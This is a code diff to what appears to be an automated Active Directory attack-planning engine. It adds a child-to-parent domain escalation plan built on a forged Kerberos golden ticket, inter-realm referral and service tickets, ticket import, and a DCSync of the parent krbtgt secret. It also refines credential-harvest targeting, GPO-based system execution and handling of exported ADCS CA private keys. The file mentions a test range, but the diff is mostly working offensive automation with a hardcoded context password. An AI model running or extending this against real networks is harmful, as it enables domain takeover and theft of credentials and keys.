@@ -102,15 +102,30 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
     live_callback_ids = _live_callback_ids(state)
     achieved = _achieved_effects(state)
     terminal_failed = _terminal_failed_effects(state)
-    unavailable_effects = achieved | terminal_failed
     ca_key_blocked_targets = _adcs_ca_private_key_blocked_targets(state)
-    admin_domains = _admin_domains(achieved)
     explicit_replication_domains = set(_replication_right_domains(achieved | facts))
 
     gpo_guids = _gpo_guid_map(facts)
     gpo_dc_scope = _gpo_dc_scope_map(facts)
-    for gpo, domain in _controlled_gpos_with_domain(facts):
-        if domain not in live_domains and "*" not in live_domains:
+    controlled_gpos = _controlled_gpos_with_domain(facts)
+    system_exec_gpos = _system_exec_gpos(achieved)
+    known_domains = {
+        *live_domains,
+        *explicit_replication_domains,
+        *(domain for _, domain in controlled_gpos),
+        *(domain for _, domain in system_exec_gpos),
+    }
+    admin_effects = _admin_domain_effects(achieved, known_domains)
+    for canonical_domain, proof_effect in admin_effects.items():
+        prefix = proof_effect.split(":", 1)[0]
+        achieved.add(f"{prefix}:{canonical_domain}")
+    admin_domains = set(admin_effects)
+    unavailable_effects = achieved | terminal_failed
+
+    for gpo, domain in controlled_gpos:
+        if "*" not in live_domains and not any(
+            _domains_equivalent(domain, live_domain) for live_domain in live_domains
+        ):
             continue
         effect = f"system-exec:gpo:{gpo}@{domain}"
         if effect in achieved:
@@ -130,7 +145,7 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
             )
         )
 
-    for gpo, domain in _system_exec_gpos(achieved):
+    for gpo, domain in system_exec_gpos:
         if f"ds-replication-rights:{domain}" in achieved:
             continue
         if _gpo_downstream_effect_proves_progress(domain, achieved):
@@ -145,7 +160,11 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
             if not context_callback:
                 same_domain_callbacks = _live_callback_ids_for_domain(state, domain)
                 if same_domain_callbacks:
-                    actions.extend(_refresh_kerberos_context_actions(domain, same_domain_callbacks))
+                    actions.extend(_refresh_kerberos_context_actions(
+                        domain,
+                        same_domain_callbacks,
+                        authorization_effect=admin_effects.get(domain, f"da:{domain}"),
+                    ))
                 else:
                     actions.extend(_ensure_kerberos_context_actions(domain, achieved, live_callback_ids))
                 continue
@@ -156,9 +175,16 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
     downstream_account_targets = _credential_accounts_required_by_downstream(
         facts,
         getattr(state, "objective", ""),
+        achieved=achieved,
+        terminal_failed=terminal_failed,
     )
 
-    for domain, account, source_fact in _credential_target_accounts(facts, unavailable_effects, getattr(state, "objective", "")):
+    for domain, account, source_fact in _credential_target_accounts(
+        facts,
+        unavailable_effects,
+        getattr(state, "objective", ""),
+        downstream_targets=downstream_account_targets,
+    ):
         effect = f"creds:{account}@{domain}"
         if effect in achieved or effect in terminal_failed:
             continue
@@ -167,7 +193,11 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
             if not context_callback:
                 same_domain_callbacks = _live_callback_ids_for_domain(state, domain)
                 if same_domain_callbacks:
-                    actions.extend(_refresh_kerberos_context_actions(domain, same_domain_callbacks))
+                    actions.extend(_refresh_kerberos_context_actions(
+                        domain,
+                        same_domain_callbacks,
+                        authorization_effect=admin_effects.get(domain, f"da:{domain}"),
+                    ))
                 else:
                     actions.extend(_ensure_kerberos_context_actions(domain, achieved, live_callback_ids))
                 continue
@@ -211,6 +241,11 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
 
     for target in _managed_local_admin_secret_targets(facts):
         account_domain, account, target_domain, target_host, source_fact = target
+        if (
+            downstream_account_targets
+            and (account_domain, account) not in downstream_account_targets
+        ):
+            continue
         effect = _managed_local_admin_secret_effect(target_host, target_domain)
         if effect in achieved:
             continue
@@ -814,6 +849,8 @@ def verify_adcs_ca_private_key_export(probe_result: dict[str, Any]) -> Capabilit
     """
     if not isinstance(probe_result, dict):
         return CapabilityVerification("failed", "probe result is not structured")
+    if probe_result.get("pfx_sha256_mismatch") is True:
+        return CapabilityVerification("blocked", "pfx sha256 mismatch", _selected_probe(probe_result))
 
     callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
     target_host = _normalize(_input_text(probe_result, "target_host", "host", "computer", "target"))
@@ -1878,8 +1915,13 @@ def extract_adcs_ca_private_key_probe(
         except Exception:
             decoded = b""
             pfx_valid = False
+    computed_pfx_sha256 = hashlib.sha256(decoded).hexdigest() if decoded else ""
+    pfx_sha256 = pfx_sha256.casefold()
+    pfx_sha256_mismatch = bool(decoded and pfx_sha256 and pfx_sha256 != computed_pfx_sha256)
     if decoded and not pfx_sha256:
-        pfx_sha256 = hashlib.sha256(decoded).hexdigest()
+        pfx_sha256 = computed_pfx_sha256
+    if pfx_sha256_mismatch:
+        pfx_valid = False
     private_key_pem = bool(re.search(
         r"-----BEGIN (?:RSA |EC |DSA |)PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |DSA |)PRIVATE KEY-----",
         text,
@@ -1943,6 +1985,7 @@ def extract_adcs_ca_private_key_probe(
         "pfx_base64_length": len(re.sub(r"\s+", "", pfx_base64)) if pfx_base64 else 0,
         "pfx_blob_valid": pfx_valid,
         "pfx_sha256": pfx_sha256,
+        "pfx_sha256_mismatch": pfx_sha256_mismatch,
         "private_key_pem_present": private_key_pem,
         "certificate_pem_present": certificate_pem,
         "ca_private_key_material_present": bool(pfx_valid or private_key_pem),
@@ -2122,7 +2165,7 @@ def extract_adcs_certificate_auth_probe(
     pkinit_tgt = bool(
         pkinit_status == "ok"
         or ticket_b64
-        or _has_any(low, ("action: ask tgt", "asktgt", "base64(ticket.kirbi)"))
+        or _has_any(low, ("tgt request successful", "base64(ticket.kirbi)"))
     )
     service_access = bool(
         ticket_probe.get("service_access_proven")
@@ -2818,6 +2861,13 @@ def _build_forge_golden_ticket_execution_plan(
         proof_resource = "{{kerberos_service_resource}}"
 
     establish_context = _input_bool(inputs, "establish_context", default=True)
+    # The inter-realm referral hop + parent-DCSync proof are specific to the forge-golden-ticket objective
+    # (cross a domain boundary and prove parent-domain DA). ensure-kerberos-context reuses this builder only to
+    # establish a callback-scoped context proven by service access, so it opts out of the referral/DCSync path.
+    cross_domain = (
+        bool(target_domain and target_domain != domain)
+        and not _input_bool(inputs, "reuse_as_kerberos_context", default=False)
+    )
     steps: list[CapabilityExecutionStep] = []
     if (
         establish_context
@@ -2869,7 +2919,107 @@ def _build_forge_golden_ticket_execution_plan(
             prerequisites=["preflight:current-context-proof-failed"],
         )
     )
-    if establish_context:
+    if cross_domain:
+        # Child->parent escalation requires two TGS exchanges: obtain a parent referral from the child DC, then
+        # exchange that referral at the parent DC for the service ticket used by the proof operation.
+        # Range-agnostic: child/parent domains and both DCs come from resolved inputs, never literals.
+        child_dc = _input_text(inputs, "child_dc", "source_dc", "child_domain_controller")
+        parent_dc = proof_host or _input_text(inputs, "parent_dc", "target_dc", "target_domain_controller")
+        referral_parameters: dict[str, Any] = {
+            "target_domain": target_domain,
+            "service": f"krbtgt/{target_domain}",
+            "ticket_base64": "{{kerberos_ticket_base64}}",
+            "nowrap": True,
+        }
+        if child_dc:
+            referral_parameters["child_dc"] = child_dc
+        dcsync_parameters: dict[str, Any] = {
+            "domain": target_domain,
+            "account": "krbtgt",
+            "executor": "native",
+        }
+        if parent_dc:
+            dcsync_parameters["dc"] = parent_dc
+        steps.extend([
+            CapabilityExecutionStep(
+                operation="kerberos-inter-realm-referral",
+                parameters=referral_parameters,
+                capability=action.name,
+                purpose=(
+                    f"exchange the forged {domain} ticket for an inter-realm referral ticket honored by "
+                    f"{target_domain}"
+                ),
+                expected_probe="extract_forged_ticket_artifact",
+                prerequisites=["artifact:kerberos_ticket_base64"],
+            ),
+            CapabilityExecutionStep(
+                operation="kerberos-service-ticket-request",
+                parameters={
+                    "target_domain": target_domain,
+                    "service": f"ldap/{parent_dc}" if parent_dc else "ldap/{{kerberos_service_host}}",
+                    "ticket_base64": "{{kerberos_ticket_base64}}",
+                    "dc": parent_dc or "{{kerberos_service_host}}",
+                    "nowrap": True,
+                },
+                capability=action.name,
+                purpose=(
+                    f"exchange the {target_domain} referral for the LDAP service ticket used by the "
+                    "parent-domain replication proof"
+                ),
+                expected_probe="extract_forged_ticket_artifact",
+                prerequisites=["artifact:kerberos_ticket_base64"],
+            ),
+            CapabilityExecutionStep(
+                operation="kerberos-ticket-purge",
+                parameters={
+                    "domain": target_domain,
+                    "target_context": "current",
+                    "store": "agent-cache",
+                },
+                capability=action.name,
+                purpose="clear the current Kerberos context before importing the referral ticket",
+                expected_probe="extract_ticket_cache_probe",
+            ),
+            CapabilityExecutionStep(
+                operation="kerberos-ticket-import",
+                parameters={
+                    "domain": target_domain,
+                    "ticket_artifact": "{{kerberos_ticket_base64}}",
+                    "target_context": "current",
+                    "store": "agent-cache",
+                },
+                capability=action.name,
+                purpose="load the referral ticket into the current Kerberos context",
+                expected_probe="extract_ticket_import_probe",
+                prerequisites=["artifact:kerberos_ticket_base64"],
+            ),
+            CapabilityExecutionStep(
+                operation="kerberos-ticket-list",
+                parameters={
+                    "domain": target_domain,
+                    "target_context": "current",
+                    "store": "agent-cache",
+                },
+                capability=action.name,
+                purpose="verify the referral ticket is present in the current context before the access proof",
+                expected_probe="extract_ticket_cache_probe",
+            ),
+            CapabilityExecutionStep(
+                operation="drsuapi-dcsync",
+                parameters=dcsync_parameters,
+                capability=action.name,
+                purpose=(
+                    f"prove parent-domain reach by replicating the {target_domain} krbtgt secret from the "
+                    "parent domain controller"
+                ),
+                expected_probe="extract_dcsync_secret_probe",
+                prerequisites=[
+                    "artifact:kerberos_ticket_base64",
+                    "ticket:kerberos_ticket_imported",
+                ],
+            ),
+        ])
+    elif establish_context:
         context_user = _input_text(inputs, "context_user", "logon_user") or user
         context_password = _input_text(inputs, "context_password", "logon_password") or "SageNetOnlyContext1!"
         context_process = _input_text(inputs, "context_process", "sacrificial_process", "run")
@@ -2939,7 +3089,11 @@ def _build_forge_golden_ticket_execution_plan(
     return CapabilityExecutionPlan(
         True,
         steps=steps,
-        reason="built generic Kerberos ticket forge plus isolated context-use and service-proof steps",
+        reason=(
+            "built child->parent forge plus referral/service TGS hops and parent-DCSync proof"
+            if cross_domain
+            else "built generic Kerberos ticket forge plus isolated context-use and service-proof steps"
+        ),
     )
 
 
@@ -2983,6 +3137,9 @@ def _build_ensure_kerberos_context_execution_plan(
     forge_inputs = dict(inputs)
     forge_inputs["domain"] = source_domain
     forge_inputs["source_domain"] = source_domain
+    # Establish a reusable Kerberos context proven by service access — keep the fork+service-proof path even
+    # cross-domain; do not divert into the forge capability's inter-realm referral / parent-DCSync proof.
+    forge_inputs["reuse_as_kerberos_context"] = True
     if target_domain != source_domain:
         forge_inputs["target_domain"] = target_domain
         forge_inputs["effect_domain"] = target_domain
@@ -4027,6 +4184,9 @@ def _build_adcs_certificate_auth_execution_plan(
     )
     ca_pfx_path = _input_text(inputs, "ca_pfx_path", "ca_cert_path", "ca_certificate_path")
     ca_pfx_password = _input_text(inputs, "ca_pfx_password", "ca_cert_password", "ca_certificate_password")
+    # PKINIT must target a KDC, not whichever host happens to be used for
+    # post-auth service proof. A CA host is a valid proof target but is not
+    # necessarily a domain controller.
     dc = _input_text(inputs, "dc", "domain_controller")
     auth_method = _normalize(
         _input_text(inputs, "certificate_auth_method", "adcs_certificate_auth_method", "auth_method")
@@ -5010,15 +5170,20 @@ def _ensure_kerberos_context_action(source_domain: str, target_domain: str, call
     )
 
 
-def _refresh_kerberos_context_action(domain: str, callback_id: str) -> CapabilityAction:
+def _refresh_kerberos_context_action(
+    domain: str,
+    callback_id: str,
+    authorization_effect: str = "",
+) -> CapabilityAction:
     domain = _normalize(domain)
     callback_id = _normalize_callback_id(callback_id)
+    authorization_effect = _canonical_effect(authorization_effect) or f"da:{domain}"
     effect = _kerberos_context_effect(domain, callback_id)
     return CapabilityAction(
         name="ensure-kerberos-context",
         target=f"domain={domain};callback={callback_id}",
         preconditions=[
-            f"da:{domain}",
+            authorization_effect,
             f"live-callback:{callback_id}",
         ],
         effects=[effect],
@@ -5049,7 +5214,7 @@ def _refresh_kerberos_context_action(domain: str, callback_id: str) -> Capabilit
             "durable DA/EA membership exists on this callback's domain, but the current Kerberos PAC may "
             "be stale; refresh tickets in-place and prove service access before DCSync"
         ),
-        source_facts=[f"da:{domain}", f"live-callback:{callback_id}"],
+        source_facts=[authorization_effect, f"live-callback:{callback_id}"],
     )
 
 
@@ -5349,6 +5514,7 @@ def _credential_target_accounts(
     facts: set[str],
     achieved: set[str],
     objective: Any = "",
+    downstream_targets: set[tuple[str, str]] | None = None,
 ) -> list[tuple[str, str, str]]:
     """Return objective-relevant non-krbtgt accounts whose credential material should be extracted.
 
@@ -5366,7 +5532,11 @@ def _credential_target_accounts(
                 targets.setdefault((domain, account), fact)
             break
 
-    downstream_targets = _credential_accounts_required_by_downstream(facts, objective)
+    downstream_targets = (
+        set(downstream_targets)
+        if downstream_targets is not None
+        else _credential_accounts_required_by_downstream(facts, objective)
+    )
     for domain, account in sorted(downstream_targets):
         if _dcsync_account_target_allowed(account, domain, achieved):
             targets.setdefault((domain, account), f"downstream-account-target:{account}@{domain}")
@@ -5400,16 +5570,23 @@ def _credential_target_accounts(
 def _credential_accounts_required_by_downstream(
     facts: set[str],
     objective: Any = "",
+    achieved: set[str] | None = None,
+    terminal_failed: set[str] | None = None,
 ) -> set[tuple[str, str]]:
     """Accounts that are not merely harvestable, but required by a downstream account-scoped edge.
 
     This is the generic satisficing rule for graph-selected identities: if the graph says a specific
     account can perform the next account-scoped action, DCSync/context work should converge on that
-    account instead of draining every sibling principal that happened to be reachable.
+    account instead of draining every sibling principal that happened to be reachable. When multiple
+    accounts lead to the same downstream effect, expose one route at a time: prefer an already-usable
+    context, then existing credentials, then an operator/objective-selected route, then a stable fallback.
     """
-    required: set[tuple[str, str]] = set()
+    achieved = set(achieved or set())
+    terminal_failed = set(terminal_failed or set())
+    routes: dict[str, set[tuple[str, str]]] = {}
+    objective_routes: set[tuple[str, str, str]] = set()
 
-    def add_from_fact(text: str) -> None:
+    def add_from_fact(text: str, *, objective_selected: bool = False) -> None:
         for prefix in _MANAGED_SECRET_READ_PREFIXES:
             if not text.startswith(prefix):
                 continue
@@ -5420,7 +5597,10 @@ def _credential_accounts_required_by_downstream(
             account_domain = _normalize(account_domain)
             account = _normalize(account)
             if account and account_domain:
-                required.add((account_domain, account))
+                effect = _managed_local_admin_secret_effect(_target_host, _target_domain)
+                routes.setdefault(effect, set()).add((account_domain, account))
+                if objective_selected:
+                    objective_routes.add((effect, account_domain, account))
             break
 
     for fact in sorted(facts):
@@ -5433,9 +5613,69 @@ def _credential_accounts_required_by_downstream(
         _text(objective),
         re.IGNORECASE,
     ):
-        add_from_fact(match.group(0).casefold())
+        add_from_fact(match.group(0).casefold(), objective_selected=True)
 
+    required: set[tuple[str, str]] = set()
+    for effect, candidates in sorted(routes.items()):
+        viable = [
+            candidate
+            for candidate in candidates
+            if not _downstream_account_route_failed(
+                candidate[0],
+                candidate[1],
+                achieved,
+                terminal_failed,
+            )
+        ]
+        if not viable:
+            continue
+        selected = min(
+            viable,
+            key=lambda candidate: _downstream_account_route_rank(
+                effect,
+                candidate[0],
+                candidate[1],
+                achieved,
+                objective_routes,
+            ),
+        )
+        required.add(selected)
     return required
+
+
+def _downstream_account_route_rank(
+    effect: str,
+    domain: str,
+    account: str,
+    achieved: set[str],
+    objective_routes: set[tuple[str, str, str]],
+) -> tuple[int, str, str]:
+    context_prefix = f"kerberos-account-context:{account}@{domain}@callback:"
+    if any(item.startswith(context_prefix) for item in achieved):
+        rank = 0
+    elif f"creds:{account}@{domain}" in achieved:
+        rank = 1
+    elif (effect, domain, account) in objective_routes:
+        rank = 2
+    else:
+        rank = 3
+    return rank, domain, account
+
+
+def _downstream_account_route_failed(
+    domain: str,
+    account: str,
+    achieved: set[str],
+    terminal_failed: set[str],
+) -> bool:
+    credential_effect = f"creds:{account}@{domain}"
+    if credential_effect in terminal_failed and credential_effect not in achieved:
+        return True
+    context_prefix = f"kerberos-account-context:{account}@{domain}@callback:"
+    return (
+        any(item.startswith(context_prefix) for item in terminal_failed)
+        and not any(item.startswith(context_prefix) for item in achieved)
+    )
 
 
 def _account_domain_from_target(value: Any) -> tuple[str, str]:
@@ -5737,15 +5977,30 @@ def _managed_secret_target_from_tail(tail: Any) -> tuple[str, str, str, str] | N
     return account_domain, account, target_domain, target_host
 
 
-def _admin_domains(predicates: set[str]) -> set[str]:
-    domains: set[str] = set()
+def _admin_domain_effects(predicates: set[str], known_domains: set[str] | None = None) -> dict[str, str]:
+    """Map canonical action domains to the exact DA/EA predicates that proved them."""
+    known = {_normalize(domain) for domain in (known_domains or set()) if _normalize(domain)}
+    domains: dict[str, str] = {}
     for predicate in predicates:
         for prefix in ("da:", "ea:"):
             if predicate.startswith(prefix):
                 domain = predicate[len(prefix):].strip()
                 if domain:
-                    domains.add(domain)
+                    resolved = domain
+                    if "." not in domain:
+                        matches = {
+                            candidate
+                            for candidate in known
+                            if "." in candidate and candidate.split(".", 1)[0] == domain
+                        }
+                        if len(matches) == 1:
+                            resolved = next(iter(matches))
+                    domains.setdefault(resolved, predicate)
     return domains
+
+
+def _admin_domains(predicates: set[str], known_domains: set[str] | None = None) -> set[str]:
+    return set(_admin_domain_effects(predicates, known_domains))
 
 
 def _ensure_kerberos_context_actions(
@@ -5773,12 +6028,17 @@ def _ensure_kerberos_context_actions(
 def _refresh_kerberos_context_actions(
     target_domain: str,
     live_callback_ids: set[str],
+    authorization_effect: str = "",
 ) -> list[CapabilityAction]:
     target_domain = _normalize(target_domain)
     if not target_domain or not live_callback_ids:
         return []
     return [
-        _refresh_kerberos_context_action(target_domain, callback_id)
+        _refresh_kerberos_context_action(
+            target_domain,
+            callback_id,
+            authorization_effect=authorization_effect,
+        )
         for callback_id in sorted(live_callback_ids)
     ]
 
@@ -6006,7 +6266,7 @@ def _legacy_gpo_downstream_effect_proves_progress(gpo: str, domain: str, achieve
 
 
 def _gpo_downstream_effect_proves_progress(domain: str, achieved: set[str]) -> bool:
-    return any(
+    if any(
         effect in achieved
         for effect in (
             f"ds-replication-rights:{domain}",
@@ -6014,7 +6274,27 @@ def _gpo_downstream_effect_proves_progress(domain: str, achieved: set[str]) -> b
             f"da:{domain}",
             f"ea:{domain}",
         )
+    ):
+        return True
+    return any(
+        _domains_equivalent(domain, effect.split(":", 1)[1])
+        for effect in achieved
+        if effect.startswith(("da:", "ea:")) and ":" in effect
     )
+
+
+def _domains_equivalent(a: str, b: str) -> bool:
+    a = _normalize(a)
+    b = _normalize(b)
+    if not a or not b:
+        return False
+    if a == b:
+        return True
+    if "." not in a and "." in b:
+        return a == b.split(".", 1)[0]
+    if "." not in b and "." in a:
+        return b == a.split(".", 1)[0]
+    return False
 
 
 _GPO_CONTROL_PREFIXES = (
@@ -6089,7 +6369,7 @@ def _live_callback_ids_for_domain(state: Any, domain: str) -> set[str]:
             _normalize(getattr(foothold, "forest", "")),
             _identity_domain(getattr(foothold, "identity", "")),
         }
-        if target_domain in domains:
+        if any(_domains_equivalent(target_domain, candidate) for candidate in domains if candidate):
             callback_ids.add(callback_id)
     return callback_ids
 
@@ -6128,6 +6408,9 @@ def _terminal_failed_effects(state: Any) -> set[str]:
     for hop in hops:
         status = _normalize(getattr(hop, "status", ""))
         if status not in {"failed", "blocked"}:
+            continue
+        evidence = getattr(hop, "evidence", {})
+        if isinstance(evidence, dict) and evidence.get("terminal_failure") is False:
             continue
         effect = _canonical_effect(getattr(hop, "effect", ""))
         if effect:
